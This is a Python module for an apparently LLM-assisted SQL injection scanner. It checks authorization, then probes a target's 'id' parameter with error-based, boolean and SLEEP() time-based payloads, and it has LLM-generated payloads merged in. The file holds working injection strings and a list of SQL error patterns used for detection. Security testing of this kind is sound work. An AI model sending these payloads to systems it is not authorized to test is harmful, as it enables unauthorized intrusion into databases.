# scanners/sqli_scanner.py
import requests
import time
from bs4 import BeautifulSoup
from llm.payload_generator import LLMPayloadGenerator
from core.authorization import AuthorizationChecker

class SQLiScanner:
    """LLM-powered SQL Injection vulnerability scanner"""

    def __init__(self, target_url, session=None):
        self.target_url = target_url
        self.session = session or requests.Session()
        self.payload_gen = LLMPayloadGenerator()
        self.auth = AuthorizationChecker()
        self.findings = []

        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Security Scanner - Authorized Testing)"
        })

        # Error patterns that indicate SQL injection
        self.error_patterns = [
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark",
            "quoted string not properly terminated",
            "sql syntax",
            "mysql_fetch",
            "mysqli_fetch",
            "pg_query",
            "sqlite_query",
            "ora-01756",
            "microsoft ole db provider for sql server",
            "odbc microsoft access driver",
            "syntax error",
            "division by zero",
            "supplied argument is not a valid mysql"
        ]

    def get_fresh_token(self, url):
        """Fetch fresh CSRF token from page"""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, "html.parser")
            token_input = soup.find("input", {"name": "user_token"})
            if token_input:
                return token_input["value"]
        except Exception as e:
            print(f"[SQLi] Error fetching token: {e}")
        return ""

    def submit_payload(self, url, param_name, payload):
        """Submit payload with fresh CSRF token"""
        try:
            token = self.get_fresh_token(url)
            params = {
                param_name: payload,
                "Submit": "Submit",
                "user_token": token
            }
            response = self.session.get(url, params=params, timeout=15)
            return response
        except Exception as e:
            print(f"[SQLi] Error submitting payload: {e}")
            return None

    def check_error_based(self, response):
        """Check if response contains SQL error messages"""
        if not response:
            return False
        text = response.text.lower()
        for pattern in self.error_patterns:
            if pattern in text:
                return pattern
        return False

    def check_boolean_based(self, url, param_name):
        """
        Compare responses for TRUE vs FALSE conditions.
        If responses differ significantly, boolean injection is possible.
        """
        try:
            token1 = self.get_fresh_token(url)
            true_resp = self.session.get(url, params={
                param_name: "1' OR '1'='1",
                "Submit": "Submit",
                "user_token": token1
            }, timeout=10)

            token2 = self.get_fresh_token(url)
            false_resp = self.session.get(url, params={
                param_name: "1' OR '1'='2",
                "Submit": "Submit",
                "user_token": token2
            }, timeout=10)

            if true_resp and false_resp:
                # If responses differ in length significantly → boolean injection likely
                len_diff = abs(len(true_resp.text) - len(false_resp.text))
                if len_diff > 50:
                    return True, len_diff
            return False, 0
        except Exception as e:
            print(f"[SQLi] Boolean check error: {e}")
            return False, 0

    def check_time_based(self, url, param_name):
        """Check if time-based blind injection is possible using SLEEP()"""
        try:
            token = self.get_fresh_token(url)
            start = time.time()
            self.session.get(url, params={
                param_name: "1' AND SLEEP(3)-- -",
                "Submit": "Submit",
                "user_token": token
            }, timeout=15)
            elapsed = time.time() - start

            if elapsed >= 3:
                return True, round(elapsed, 2)
            return False, round(elapsed, 2)
        except Exception as e:
            print(f"[SQLi] Time-based check error: {e}")
            return False, 0

    def scan(self):
        """Main SQLi scan method"""

        if not self.auth.check_authorization(self.target_url):
            print("[SQLi] ❌ Scan aborted - Target not authorized!")
            return []

        print(f"\n[SQLi] 🔍 Starting SQL Injection scan on: {self.target_url}")

        # Generate LLM payloads
        print("[SQLi] Generating SQLi payloads using LLM...")
        llm_payloads = self.payload_gen.generate_sqli_payloads(
            db_type="MySQL",
            param_name="id",
            observed_behavior="returns user information"
        )

        # Static reliable payloads
        static_payloads = [
            ("id", "'"),
            ("id", "\""),
            ("id", "1' OR '1'='1"),
            ("id", "1' OR '1'='1'--"),
            ("id", "1 OR 1=1"),
            ("id", "' OR 1=1--"),
            ("id", "1' AND SLEEP(3)-- -"),
        ]

        # Add LLM payloads
        for p in llm_payloads:
            if isinstance(p, dict):
                static_payloads.append(("id", p.get("payload", "")))

        print(f"[SQLi] Testing {len(static_payloads)} payloads...")

        # --- Test 1: Error-based detection ---
        print("\n[SQLi] --- Testing Error-Based Injection ---")
        for param, payload in static_payloads:
            if not payload:
                continue
            response = self.submit_payload(self.target_url, param, payload)
            error = self.check_error_based(response)
            if error:
                finding = {
                    "type": "SQL Injection - Error Based",
                    "url": self.target_url,
                    "parameter": param,
                    "payload": payload,
                    "severity": "Critical",
                    "evidence": f"SQL error detected: '{error}'"
                }
                self.findings.append(finding)
                print(f"[SQLi] ✅ VULNERABLE (Error-Based)! Payload: {payload[:50]}")
                break
        else:
            print("[SQLi] No error-based injection detected")

        # --- Test 2: Boolean-based detection ---
        print("\n[SQLi] --- Testing Boolean-Based Injection ---")
        vulnerable, diff = self.check_boolean_based(self.target_url, "id")
        if vulnerable:
            finding = {
                "type": "SQL Injection - Boolean Based",
                "url": self.target_url,
                "parameter": "id",
                "payload": "1' OR '1'='1 vs 1' OR '1'='2",
                "severity": "Critical",
                "evidence": f"Response length difference: {diff} chars between TRUE/FALSE conditions"
            }
            self.findings.append(finding)
            print(f"[SQLi] ✅ VULNERABLE (Boolean-Based)! Response diff: {diff} chars")
        else:
            print("[SQLi] No boolean-based injection detected")

        # --- Test 3: Time-based detection ---
        print("\n[SQLi] --- Testing Time-Based Blind Injection ---")
        print("[SQLi] This test takes ~3 seconds...")
        vulnerable, elapsed = self.check_time_based(self.target_url, "id")
        if vulnerable:
            finding = {
                "type": "SQL Injection - Time Based Blind",
                "url": self.target_url,
                "parameter": "id",
                "payload": "1' AND SLEEP(3)-- -",
                "severity": "Critical",
                "evidence": f"Response delayed by {elapsed}s indicating SLEEP() executed"
            }
            self.findings.append(finding)
            print(f"[SQLi] ✅ VULNERABLE (Time-Based)! Response took: {elapsed}s")
        else:
            print(f"[SQLi] No time-based injection detected (response: {elapsed}s)")

        print(f"\n[SQLi] Scan complete. Found {len(self.findings)} vulnerability/vulnerabilities.")
        return self.findings
